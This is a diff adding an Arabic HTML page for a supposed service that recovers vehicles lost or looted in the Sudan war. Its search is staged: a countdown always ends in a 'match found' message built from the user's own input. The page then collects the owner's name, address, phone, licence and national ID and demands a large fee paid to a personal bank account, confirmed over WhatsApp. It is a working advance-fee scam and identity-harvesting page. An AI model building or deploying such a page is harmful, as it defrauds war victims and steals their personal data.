@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة المعز القيصر للمركبات المفقودة</title>
+    <style>
+        :root {
+            --primary-gold: #e5c47b; 
+            --royal-blue: #1e3a8a; 
+            --bg-deep-black: #050505; 
+            --input-bg: #1c1c1c; 
+            --text-white: #ffffff;
+            --text-gray: #a0a0a0;
+            --whatsapp-green: #25D366;
+            --stat-card-bg: #ffffff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-deep-black); 
+            color: var(--text-white);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            border: 4px solid var(--primary-gold); 
+            box-sizing: border-box; 
+        }
+
+        .container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem; 
+        }
+
+        .card {
+            width: 100%;
+            max-width: 500px; 
+            background: transparent; 
+            text-align: center;
+        }
+
+        .logo-box { margin-bottom: 2rem; }
+        .main-logo {
+            max-width: 190px; 
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+
+        h1 { color: var(--primary-gold); font-size: 1.8rem; margin-bottom: 0.5rem; }
+        h2 { color: var(--primary-gold); font-size: 1.4rem; margin-top: 1.5rem; }
+        
+        .info-text {
+            text-align: justify;
+            font-size: 0.95rem;
+            line-height: 1.7;
+            color: var(--text-white);
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .stat-item {
+            background: var(--stat-card-bg);
+            padding: 20px 10px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            transition: transform 0.3s ease;
+        }
+
+        .stat-item:hover { transform: translateY(-5px); }
+
+        .stat-number {
+            display: block;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--royal-blue);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            display: block;
+            font-size: 0.85rem;
+            color: #555;
+            font-weight: bold;
+        }
+
+        .policy-box {
+            text-align: right;
+            font-size: 0.85rem;
+            color: var(--text-gray);
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #222;
+            margin-bottom: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .input-group { margin-bottom: 18px; text-align: right; }
+        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: var(--primary-gold); font-weight: bold; }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: var(--input-bg);
+            color: white;
+            box-sizing: border-box;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--royal-blue), #152c5a);
+            border: 1px solid var(--primary-gold);
+            border-radius: 8px;
+            color: var(--primary-gold);
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .btn-whatsapp {
+            background: var(--whatsapp-green);
+            color: white;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .payment-box {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px dashed var(--primary-gold);
+            margin-bottom: 20px;
+        }
+
+        #intro-section, #form-section, #search-section, #result-section, #owner-section, #payment-section { display: none; }
+        #intro-section { display: block; }
+
+        .loader {
+            border: 4px solid #333; border-top: 4px solid var(--primary-gold);
+            border-radius: 50%; width: 60px; height: 60px;
+            animation: spin 1s linear infinite; margin: 30px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .timer-display { font-size: 3rem; font-weight: bold; color: var(--primary-gold); }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="logo-box"><img src="logo.jpg" alt="Logo" class="main-logo"></div>
+
+        <div id="intro-section">
+            <h1>منصة المعز القيصر للمركبات المفقودة</h1>
+            <div class="info-text">
+                نظام <strong>القيصر</strong> هو النظام التقني الأول المتخصص في رصد واستعادة المركبات التي فقدت أو نُهبت خلال <strong>حرب السودان</strong>، بالإضافة إلى تتبع المركبات المسروقة، معتمداً على أكبر قاعدة بيانات ميدانية يتم تحديثها على مدار الساعة.
+                <br><br>
+                نمتلك شبكة واسعة تضم هناقر ومواقع تجميع مخصصة لحفظ المركبات المستعادة، مع تواصل مباشر ولحظي مع كافة بوابات الدخول والخروج في المدن الآمنة (تحت سيطرة القوات المسلحة) <strong>لرصد حركة المركبات التي يشتبه في سرقتها او نهبها او ان سائقها من اصحاب السوابق (الفيش الجنائي )</strong>. كما يتواجد مناديبنا داخل أقسام الشرطة الرئيسية لضمان مطابقة البلاغات واسترداد الحقوق لأصحابها بأعلى دقة.
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <span class="stat-number">1,122</span>
+                    <span class="stat-label">مركبة مستلمة</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">700</span>
+                    <span class="stat-label">موظف بخدمتكم</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">55,075</span>
+                    <span class="stat-label">مركبة مرصودة</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">44,896</span>
+                    <span class="stat-label">عملية بحث</span>
+                </div>
+            </div>
+
+            <h2>سياسة الخصوصية واسترداد الأموال</h2>
+            <div class="policy-box">
+                <strong>1. الخصوصية:</strong> نلتزم بحماية بيانات المالك والمركبة ولا يتم مشاركتها إلا مع الجهات الأمنية المختصة لإكمال عملية التسليم.
+                <br><br>
+                <strong>2. الرسوم الإدارية:</strong> الرسوم المدفوعة مخصصة لتغطية تكاليف التشغيل الميداني، رادارات الرصد، ونفقات الفرق العاملة.
+                <br><br>
+                <strong>3. سياسة الاسترداد:</strong> في حال تم دفع الرسوم ولم يتم تحديد الموقع الدقيق للمركبة خلال 72 ساعة من تأكيد البلاغ، يحق للمشترك استرداد 80% من المبلغ المدفوع، مع خصم 20% كرسوم تشغيل إدارية تقنية.
+            </div>
+
+            <button class="btn-submit" onclick="showForm()">ابدأ عملية المطابقة الآن</button>
+        </div>
+
+        <div id="form-section">
+            <h1>بيانات المركبة</h1>
+            <div class="input-group"><label>نوع المركبة</label><input type="text" id="carName" placeholder="مثال: لاندكروزر 2024"></div>
+            <div class="input-group"><label>رقم اللوحة</label><input type="text" id="plateNumber" placeholder="مثال: خ 6 888"></div>
+            <div class="input-group"><label>رقم الشاسي (الهيكل)</label><input type="text" id="chassis" placeholder="رقم الشاسي"></div>
+            <div class="input-group"><label>لون السيارة</label><input type="text" id="carColor" placeholder="اللون"></div>
+            <div class="input-group"><label>آخر مكان شوهدت فيه</label><input type="text" id="lastSeen" placeholder="المدينة أو الحي"></div>
+            <div class="input-group"><label>العلامات المميزة</label><textarea id="features" rows="2"></textarea></div>
+            <button class="btn-submit" onclick="runSearch()">بدء المطابقة الأمنية</button>
+        </div>
+
+        <div id="search-section">
+            <h2 style="color: var(--primary-gold);">جاري فحص قاعدة البيانات...</h2>
+            <div class="loader"></div>
+            <div class="timer-display" id="countdown">10</div>
+            <p style="font-size: 0.9rem; color: #888;">يتم مطابقة البيانات مع نظام القيصر والبوابات الأمنية</p>
+        </div>
+
+        <div id="result-section">
+            <h2 style="color: #4bb543;">✓ تم إيجاد تطابق!</h2>
+            <p id="result-text" style="font-weight: bold; margin-top: 20px;"></p>
+            <button class="btn-submit" onclick="showOwnerForm()">إكمال بيانات المالك</button>
+        </div>
+
+        <div id="owner-section">
+            <h2 style="color: var(--primary-gold);">بيانات مالك المركبة</h2>
+            <div class="input-group"><label>الاسم الكامل</label><input type="text" id="ownerName"></div>
+            <div class="input-group"><label>السكن الحالي</label><input type="text" id="ownerAddress"></div>
+            <div class="input-group"><label>رقم الواتساب</label><input type="text" id="ownerPhone"></div>
+            <div class="input-group"><label>رقم الرخصة</label><input type="text" id="license"></div>
+            <div class="input-group"><label>الرقم الوطني</label><input type="text" id="nationalId"></div>
+            <button class="btn-submit" onclick="showPaymentForm()">متابعة للدفع</button>
+        </div>
+
+        <div id="payment-section">
+            <h2 style="color: var(--primary-gold);">الرسوم الإدارية</h2>
+            <p style="font-size: 0.9rem; line-height: 1.5;">لتحديد موقع وجود المركبة الدقيق، يرجى دفع رسوم إدارية لتغطية نفقات الفريق العامل وإكمال إجراءات التسليم.</p>
+            <div class="payment-box">
+                <p>المبلغ: <strong>200,000 ج.س</strong></p>
+                <p>رقم الحساب: <br><strong style="color: var(--primary-gold);">2938747</strong></p>
+                <p>اسم صاحب الحساب: <br><strong style="color: var(--primary-gold);">الهام الطيب احمد</strong></p>
+            </div>
+            <div class="input-group"><label>رقم العملية</label><input type="text" id="transactionId" placeholder="ادخل رقم العملية هنا بعد نسخه من الاشعار"></div>
+            <button class="btn-submit btn-whatsapp" onclick="sendToWhatsApp()">تأكيد البلاغ عبر الواتساب</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function showForm() {
+        document.getElementById('intro-section').style.display = 'none';
+        document.getElementById('form-section').style.display = 'block';
+    }
+
+    function runSearch() {
+        const carName = document.getElementById('carName').value;
+        const plateNumber = document.getElementById('plateNumber').value;
+        if(!carName || !plateNumber) return alert("يرجى ملء الحقول");
+        
+        document.getElementById('form-section').style.display = 'none';
+        document.getElementById('search-section').style.display = 'block';
+        let s = 10;
+        const timer = setInterval(() => {
+            s--; document.getElementById('countdown').innerText = s;
+            if(s <= 0) {
+                clearInterval(timer);
+                document.getElementById('search-section').style.display = 'none';
+                document.getElementById('result-section').style.display = 'block';
+                document.getElementById('result-text').innerText = `تمت مطابقة اسم المركبة: (${carName}) مع اللوحة: (${plateNumber}) بنجاح في قاعدة بياناتنا.`;
+            }
+        }, 1000);
+    }
+
+    function showOwnerForm() {
+        document.getElementById('result-section').style.display = 'none';
+        document.getElementById('owner-section').style.display = 'block';
+    }
+
+    function showPaymentForm() {
+        document.getElementById('owner-section').style.display = 'none';
+        document.getElementById('payment-section').style.display = 'block';
+    }
+
+    function sendToWhatsApp() {
+        const transId = document.getElementById('transactionId').value;
+        if(!transId) return alert("أدخل رقم العملية");
+        const msg = `*بلاغ استرداد مركبة - منصة المعز القيصر*%0A- النوع: ${document.getElementById('carName').value}%0A- اللوحة: ${document.getElementById('plateNumber').value}%0A- المالك: ${document.getElementById('ownerName').value}%0A- رقم العملية: ${transId}`;
+        window.open(`https://wa.me/249112508713?text=${msg}`, '_blank');
+    }
+</script>
+
+</body>
+</html>
